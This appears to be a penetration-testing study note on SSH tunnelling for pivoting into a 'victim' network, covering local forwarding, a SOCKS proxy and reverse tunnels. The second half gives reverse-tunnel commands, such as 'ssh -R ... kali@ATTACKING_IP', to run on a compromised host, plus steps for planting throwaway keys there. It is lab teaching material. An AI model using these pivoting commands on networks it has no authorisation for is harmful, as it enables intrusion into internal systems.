# SSH Tunneling/Port Forwarding

Using the standard SSH client and an OpenSSH server, it's possible to create both forward and reverse connections to make SSH "tunnels", which allows us to forward ports and/or create proxies

### Forward Connections

Typically creating a forward (or "local") SSH tunnel is done on Linux servers and less on Windows as Linux servers typically have SSH active and open. This does of course require SSH access to the machine.

Two ways of creating a forward SSH tunnel using the SSH client:

- **Port Forwarding**: This method utilises the **-L** switch, creating a local port. Example: Say we have SSH access to **172.16.0.5** and there is a webserver running **172.16.0.10** , we could use the following command to create a link to the server on **172.16.0.10**: **ssh -L 8000:172.16.0.10:80 user@172.160.0.5 -fN**. From here we could access the webserver on **172.16.0.10** (through **172.16.0.5**) by navigating to port **8000** on our own machine. This would be as simple as entering localhost:8000 as we have now created that tunnel between our machine and the victims network via port **80** on the target and **8000** on our machine. In our command we used the combined switch of **-fN**, this does two things: the **-f** switch backgrounds the shell so that we have our terminal back and the **-N** switch lets SSH know that there is no requirement to execute any commands, it just needs to establish a connection
- **Proxies**: The following command utilises the switch -D to setup a proxy on the port **1337** (arbitrary port can be anything you want, usually best practice to go high as the lower ports often have designated services). **ssh -D 1337 user@172.16.0.5 -fN**. This will enable port **1337** on our attacking machine as a proxy to send data through into the protected network. You can combine this command with proxychains

### Reverse Connections

Reverse connections are very useful (particularly if you have shell access but not ssh access) however, it is significantly riskier as you have to access your attacking machine from the target machine

To create a reverse connection, first you must do a few steps to ensure you can do it safely:

1.  First you have to generate a new set of SSH keys using **ssh-keygen** on your attacking machine. This command will generate a private and public key
2.  Ensure you have a directory **~/.ssh** and **authorised_keys** file then copy the contents of the public key (.pub file) and edit the **~/.ssh/authorised_keys** file that you just created on your attacking machine
3.  In the **authorised_keys** file, on a new line, paste this command **command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty** then paste in the public key. This will prevent a shell being created on your attacking machine

You can now check to see if ssh is running on your attacking system using the command **sudo systemctl status ssh**

If it is not running you can start the service with the following command **sudo systemctl start ssh**

Now that we have our service running and our throwaway keys created we can transfer the private key to the target system so we can create our reverse connection. It's important to note here that this is a throwaway set of SSH keys and that once we finish our connection we need to delete them (and ideally stop SSH if we don't need it running) so that once we finish our attack our victim can't connect to our server, for obvios reason that would be less than ideal

We can use the following command structure to construct a command that will allow us to connect back to our attacking machine from the target machine: **ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN**

In our example case of **172.16.0.10** and **172.16.0.5**. We could use our shell on **172.16.0.5** to give our attacking box (**172.16.0.20**) access to the webserver located at **172.16.0.10**, we could use this command on our compromised machine at **172.16.0.5**: **ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN**

Of note is that newer SSH clients allow for the creation of a reverse proxy. The following command could be used to create a reverse proxy assuming the client supports it: **ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN**

Modern Windows clients also come with an inbuilt SSH client available by default which allows us to make use of this technique in Windows systems


